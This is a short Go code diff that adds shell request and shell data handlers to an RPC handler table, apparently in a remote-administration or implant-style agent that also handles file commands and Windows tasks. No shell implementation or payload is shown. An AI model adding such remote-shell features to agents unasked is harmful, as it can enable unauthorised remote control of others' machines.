@@ -27,6 +27,9 @@ var (
 		pb.MsgPwdReq:      pwdHandler,
 		pb.MsgRmReq:       rmHandler,
 		pb.MsgMkdirReq:    mkdirHandler,
+
+		pb.MsgShellReq:  startShellHandler,
+		pb.MsgShellData: shellDataHandler,
 	}
 )
 
@@ -35,6 +38,7 @@ func getSystemHandlers() map[uint32]RPCHandler {
 }
 
 // ---------------- Windows Handlers ----------------
+
 func taskHandler(data []byte, resp RPCResponse) {
 	task := &pb.Task{}
 	err := proto.Unmarshal(data, task)
